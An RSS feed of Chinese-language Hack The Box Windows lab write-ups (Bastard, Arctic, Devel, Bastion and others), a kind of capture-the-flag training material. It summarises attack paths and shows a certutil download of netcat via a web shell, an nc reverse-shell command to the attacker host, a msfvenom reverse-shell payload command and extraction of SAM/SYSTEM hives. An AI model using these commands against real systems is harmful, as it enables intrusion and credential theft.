<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>HTB on 养猪日记</title>
    <link>https://yangzhuzai.github.io/categories/htb/</link>
    <description>Recent content in HTB on 养猪日记</description>
    <image>
      <title>养猪日记</title>
      <url>https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- 0.135.0</generator>
    <language>en</language>
    <lastBuildDate>Fri, 11 Oct 2024 14:25:59 +0800</lastBuildDate>
    <atom:link href="https://yangzhuzai.github.io/categories/htb/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>0X000 HTB windows靶机总结</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x000-htb-windows%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x000-htb-windows%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/</guid>
      <description>&lt;p&gt;个人打靶经历，不追求完美，只是记录，早些记录较为粗糙，见谅。&lt;/p&gt;
&lt;h1 id=&#34;0x001bastard--中等-非域&#34;&gt;0x001：Bastard  中等 非域&lt;/h1&gt;
&lt;p&gt;渗透路线：drupal web漏洞&amp;ndash;&amp;gt;fuzz端点&amp;ndash;&amp;gt;修改poc&amp;ndash;&amp;gt;getshell&amp;ndash;&amp;gt;提权使用winpeass&amp;ndash;&amp;gt;ms15-051&lt;/p&gt;
&lt;p&gt;考点：drupal漏洞信息查找、fuzz的理解、poc理解和使用&lt;/p&gt;
&lt;h1 id=&#34;0x002arctic-简单-非域&#34;&gt;0x002：Arctic 简单 非域&lt;/h1&gt;
&lt;p&gt;渗透思路：端口扫描无果&amp;ndash;&amp;gt;http访问&amp;ndash;&amp;gt;发现adobe coldfusion&amp;ndash;&amp;gt;漏洞信息查找&amp;ndash;&amp;gt;漏洞利用getshgell&amp;ndash;&amp;gt;提权使用winpeass&amp;ndash;&amp;gt;ms16-032&lt;/p&gt;
&lt;p&gt;考点：较为简单，思路常规，正常渗透即可完成&lt;/p&gt;
&lt;h1 id=&#34;0x003devel-简单-非域&#34;&gt;0x003：Devel 简单 非域&lt;/h1&gt;
&lt;p&gt;渗透思路：FTP匿名登录&amp;ndash;&amp;gt;发现web网站和匿名登录目录一致&amp;ndash;&amp;gt;生成asp木马反弹shell&amp;ndash;&amp;gt;提权使用winpeass&amp;ndash;&amp;gt;ms16-032&lt;/p&gt;
&lt;p&gt;考点：较为简单，思路常规，正常渗透即可完成&lt;/p&gt;
&lt;h1 id=&#34;0x004bastion-中等-非域&#34;&gt;0x004：Bastion 中等 非域&lt;/h1&gt;
&lt;p&gt;渗透思路：smb匿名访问&amp;ndash;&amp;gt;windows image backup &amp;ndash;&amp;gt;发现vhd的备份文件 &amp;ndash;&amp;gt;发现是C盘&amp;ndash;&amp;gt;导出SAM和SYSTEM文件&amp;ndash;&amp;gt;读取hash&amp;ndash;&amp;gt;破解&amp;ndash;&amp;gt;提权&lt;/p&gt;
&lt;p&gt;提权无法直接通过脚本提示，需要查找软件目录，发现非常规软件mRemoteNG&amp;mdash;&amp;gt;信息查找，发现该软件可能存在密码读取的情况&amp;ndash;&amp;gt;漏洞利用，提取administrator密码成功&lt;/p&gt;
&lt;p&gt;考点：VHD硬盘备份、sam文件读取、mRemoteNG密码提取；知识点盲区是本靶场的核心问题。&lt;/p&gt;
&lt;h1 id=&#34;0x005blue-简单-非域&#34;&gt;0x005：Blue 简单 非域&lt;/h1&gt;
&lt;p&gt;渗透思路：nmap告诉存在ms17-010&amp;ndash;&amp;gt;需要了解python如何实现ms17-010&lt;/p&gt;
&lt;p&gt;考点：在不依赖msf的情况下，如何打ms17-010&lt;/p&gt;
&lt;h1 id=&#34;0x006bounty-简单-非域&#34;&gt;0x006：Bounty 简单 非域&lt;/h1&gt;
&lt;p&gt;渗透思路：目录扫描发现上传功能&amp;ndash;&amp;gt;但是无法上传正常的后缀&amp;ndash;&amp;gt;通过fuzz发现可上传.config后缀&amp;ndash;&amp;gt;该后缀在II7.0以上可以getshell&amp;ndash;&amp;gt;提权ms16-032&lt;/p&gt;
&lt;p&gt;考点：config getshell&lt;/p&gt;
&lt;h1 id=&#34;0x007acute-困难-域渗透非常规打法&#34;&gt;0x007：Acute 困难 域渗透（非常规打法）&lt;/h1&gt;
&lt;p&gt;端口扫描：&lt;/p&gt;
&lt;p&gt;发现443 https端口，浏览器访问失效，通过证书发现域名，修改hosts文件，成功访问到了网页。&lt;/p&gt;
&lt;p&gt;web渗透：&lt;/p&gt;
&lt;p&gt;首页about us，泄露部分出名员工名称，同时有个新人表单，通过新人表单，可以发现PSWA入口以及默认密码：Password1!，以及创建者主机信息：Acute-PC01以及Lois用户是网站管理员等信息；通过泄露的员工名，拼接首字母和后面的名，使用默认密码，成功撞库PSWA，获取立足点powershell，普通权限，用户名：acute\edavies。&lt;/p&gt;
&lt;p&gt;后渗透阶段：&lt;/p&gt;
&lt;p&gt;这台靶机目前最好还是使用meterpreter，完全避免使用meterpreter的话，会花费巨量时间，以及部分功能可能无法通过脚本实现。&lt;/p&gt;
&lt;p&gt;后渗透-横向移动阶段1：&lt;/p&gt;
&lt;p&gt;通过查看当前的远程登录会话，可以发现目前的用户acute\edavies是使用了RDP的，使用meterpreter的屏幕监控功能，查看当前用户的操作，发现了另外一台主机名为：ATSSERVER，以及一个相关凭证：密码：W3_4R3_th3_f0rce.用户：acute\imonks，使用powershell，申请凭证，获取到ATSSERVER普通权限，可以拿到第一个user.txt，同时使用这个用户可以发现Program Files目录下有个keepmeon目录，是用户安装的，非常规软件目录，但是当前\imonks用户没有权限进入。&lt;/p&gt;
&lt;p&gt;后渗透-横向移动阶段2：&lt;/p&gt;
&lt;p&gt;在第一个user.txt的附近有主机Acute-PC01的脚本信息，虽然密码进行了加密，但是可以修改脚本达到命令执行的效果，反弹一个脚本内用户的权限为：acute\jmorgan，属于本地管理员用户组，也就是说我们拿到了Acute-PC01主机的管理员权限。&lt;/p&gt;
&lt;p&gt;后渗透-横向移动阶段3：&lt;/p&gt;
&lt;p&gt;使用Acute-PC01主机的管理员权限dumphash，拿到本地administrator的密码，但是无法登录ATSSERVER，由于我们之前拥有ATSSERVER的imonks用户，通过查看用户目录，可以知道该主机有哪些用户登录过了，使用Acute-PC01主机的密码进行喷洒，成功获取了一个名为awallace的用户。&lt;/p&gt;
&lt;p&gt;后渗透-横向移动阶段4：&lt;/p&gt;
&lt;p&gt;awallace用户可以进去keepmeon目录，这个目录下面有个bat文件，内容为计划任务，执行者为Lois，该用户是最开始告诉我们的网站管理员，同时在域内查找用户组，可以发现，site_admin用户组，该用户组属于domain admin group用户组，也就是说这个计划任务可以让我们获得域管理员组权限，利用这个BAT提权成功，即可获得ATSSERVER主机的管理员权限，拿到最终的flag.&lt;/p&gt;
&lt;p&gt;考点：1、信息收集；2、pswa；3、powershell熟练度；4、内网信息收集，密码获取；5、计划任务提权&lt;/p&gt;
&lt;p&gt;放在最后：这个靶机的打法及其非常规，最开始的信息收集便在一直挑战打靶者的思路完善程度，内网的提权和信息收集过程，更是把两个机器当成一个整体的思维在进行渗透，信息收集的程度堪称离谱，powershell的熟悉程度也是一个不小的挑战，最后的来回横跳巨爽。&lt;/p&gt;
&lt;h1 id=&#34;0x008timelapse-简单-域渗透&#34;&gt;0x008：Timelapse 简单 域渗透&lt;/h1&gt;
&lt;p&gt;渗透思路：
smb匿名访问&amp;ndash;&amp;gt;zip文件&amp;ndash;&amp;gt;破解发现pfx文件&amp;ndash;&amp;gt;再次破解&amp;ndash;&amp;gt;提取出私钥和公钥&amp;ndash;&amp;gt;wirm登录&amp;ndash;&amp;gt;提权，通过查看powershell历史记录，发现账号密码&amp;ndash;&amp;gt;发现该账号具有laps_readers组权限，可以读取administraor密码&lt;/p&gt;
&lt;p&gt;考点：1、PFX；2、laps_readers&lt;/p&gt;
&lt;h1 id=&#34;0x009streamio-中等-域渗透&#34;&gt;0x009：StreamIO 中等 域渗透&lt;/h1&gt;
&lt;p&gt;渗透思路：
web渗透&amp;ndash;&amp;gt;注意证书的域名变化&amp;ndash;&amp;gt;再次目录扫描&amp;ndash;&amp;gt;发现sql注入&amp;ndash;&amp;gt;获取网站的用户名和密码&amp;ndash;&amp;gt;通过burp爆破，成功获取到合法用户&amp;ndash;&amp;gt;进入后台，注意url存在?&amp;ndash;&amp;gt;fuzz发现debug参数&amp;ndash;&amp;gt;是个文件包含，需要使用base64带出&amp;ndash;&amp;gt;这里的思路有点非常规，爆破当前目录，发现master.php，读取它&amp;ndash;&amp;gt;发现它接收post提交的参数，并执行&amp;ndash;&amp;gt;通过文件包含，并携带参数，命令执行反弹shell&amp;ndash;&amp;gt;读取数据库账号密码&amp;ndash;&amp;gt;winrm登录&amp;ndash;&amp;gt;读取浏览器密码&amp;ndash;&amp;gt;获取到JDgodd用户权限&amp;ndash;&amp;gt;修改CORE STAFF组的拥有者为JDgodd，把自己添加到组内，并修改dacl，读取密码&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X001 Bastard</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x001-bastard/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x001-bastard/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描：&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb3d7a7acb7f5875803b8d77d07427b3eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE47f3572f4d6819bed9f11b147ff33718image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h2 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0adc3946b4962d062d144b04c4b91882image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4771da8485050d5158dfe97c2d6a81dcimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;版本是7.54：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEacfa99ca7197578961cf197a69b65897image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;判断一下，基本能用的就这些：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd9ef537a0ef532d40abd2a39e7d78db3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;第一个遇到需要寻找一个端点，来进行渗透测试：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE361f32b7cee278d6e2397924972769e7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过gobuster发现node：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2d914653c97c19b2474e340f7c0ee87eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;对该目录接着进行扫描，发现01：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE060b2eecf0df2aa12ed8723373928449image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;访问一下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE75bad0944eda4e2d29aea5db9b89368bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;点击：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE204736d39eca3b90bbe5da6e8ca0cac3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;把rest和rest_endpoint输入进去：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEde39c6c08041508ae9b3c72f521ba4e8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;执行成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4b89a0370927b80ba773bb5027f6b820image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;替换代码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1272b51816c79b770e4d253ff22071b8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;执行：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE34510262979338e66fe15a8a177eb07bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;上传nc:&lt;/p&gt;
&lt;p&gt;http://10.10.10.9/cxk.php?cxk=certutil -urlcache -split -f http://10.10.16.4/nc64.exe C:\Windows\Temp\b.exe&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb8ea0f9ba79c3e54cba1450d84b8f819image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;反弹shell:&lt;/p&gt;
&lt;p&gt;start C:\Windows\Temp\b.exe -e cmd.exe 10.10.16.4 9999&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe858889d3ce85b26fab611d93873b3adimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用第二个rb的脚本也是可以的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE54d3e3046eaf9f5cabaa77e51418c19cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE42d10c5ffacaba987b93e0f00f09e691image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE71fa67f3fe83b1240de15a3f64eccc75image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ipconfig:&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X002 Arctic</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x002-arctic/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x002-arctic/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf6d72da494f38de5fed08804d34a61c3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE833aee3fd7f537d2c3b8a04e9f154944image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE53d7733878f164ca14703d16760544e1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;端口扫描没有发现什么东西，使用浏览器看看：&lt;/p&gt;
&lt;p&gt;在8500端口发现目录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE41b83d461cb7a5a03146d8fa1eb8d1afimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;多点几个，就可以发现一个登录页面：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2541ac8fbc25bd846fc4973eb39cb6f4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE94bcf131227a9d45707970a4b861a941image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;简单修改一下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE89c15fee79f0f23d1e5d9b727b13a407image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;getshell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE53d6caae5bd8100a6f39643b67ab2aadimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;user.txt&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb942387a31d460081eefbb1455493548image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE218a61c3eda589112c633a28f358c0a6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfb0873c52764bdcd00533bb59327ba5aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;脚本跑一半卡住了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5c4e536796440628e46856af9c8fd32bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;暂且试试这个吧：&lt;/p&gt;
&lt;p&gt;找了很多地方，最后在github找到了这个：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/zcgonvh/MS16-032/releases/tag/Release&#34;&gt;https://github.com/zcgonvh/MS16-032/releases/tag/Release&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEeb78205aafb5cd8aa28bdf152bbbd822image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3bf028759e5e97dc57898d9c1a8f18ceimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEce39594a2e63d6e20c40de5570dba99eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X003 Devel</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x003-devel/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x003-devel/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8fa170ba37f4fdeeebab2d8169336c34image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE77147834dff16d0532bf298f0ff45314image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE20d52032feda99b423deb2fa93ae93a2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;ftp匿名登录:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdda843ba7d07b35e6a5190d2007b8a8bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;HTTP配合：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4585ba8026fe26a06f7f20ad79925988image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;生成木马：&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=8889 -f aspx -o cxk.aspx&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE93b9d30a443c1afadfd86c98d81e9888image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa5950510bcf11e167cd7053203227b51image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEda8018e18f77cf2ea0a6ec577ac7757dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;没有任何补丁：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE509e781aa6e38526e096213733c82c83image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;内核提权试试：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE87c9c9a4ef6e7a3b8aa0cf997a4692a3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE310b6501a12cf39328a35d979f49c2eeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;上传32位的nc:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/int0x33/nc.exe/blob/master/nc.exe&#34;&gt;https://github.com/int0x33/nc.exe/blob/master/nc.exe&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc4e3a7d776e726e569ad4208ad021cdeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe3ae08c61484e306d1701a528ecf7c63image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;6988a0c5429f9c38b48a927333d8701a&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6c35dd9d6df83c998958875edb31c3f6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X004 Bastion</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x004-bastion/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x004-bastion/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE20936b99374514d5e6ce2add517036fbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE78871723166dee836b3bcf80aa89cb7bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0b9f7b952b6c488dadfaf68b6a3b4497image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbd2917511f778e19cf733f1cb967c44cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;smb：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE901e48ea26c5f42847cfbec1c0ac19d4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;挂载到本地：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1084e891b2be7b0ed64a326eaa4ef7d4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE15cd0f823721b338a90296ab512810d7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;打开后，慢慢翻查，没有发现什么有效的东西，但是后面看了一下，最重要的是哪个backup文件夹，里面有两个和其他不一样的文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf62a948c97343673c5df70a32bae460bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;借助GPT，我们可以知道是什么东西，其实是个硬盘，是硬盘就可以看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEddc0d0b86fbc12fe370d2363e0107786image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用guestmount进行挂载：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;安装：
sudo apt-get install libguestfs-tools


使用
sudo guestfish --rw -a 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
run
list-filesystems  ****查看要挂载的文件系统
exit
挂载：
sudo guestmount -a 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd -m /dev/sda1 /mnt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbf560e890ecfa9ba6ade9959b8c2c2a5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE36aa2d778925d3064fa40a5274ca18a7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;sam文件地址：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\WIndows\System32\config\SAM
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;SYSTEM hives地址：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; C:\Windows\System32\config\SYSTEM
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把这两个文件拷贝出来：&lt;/p&gt;
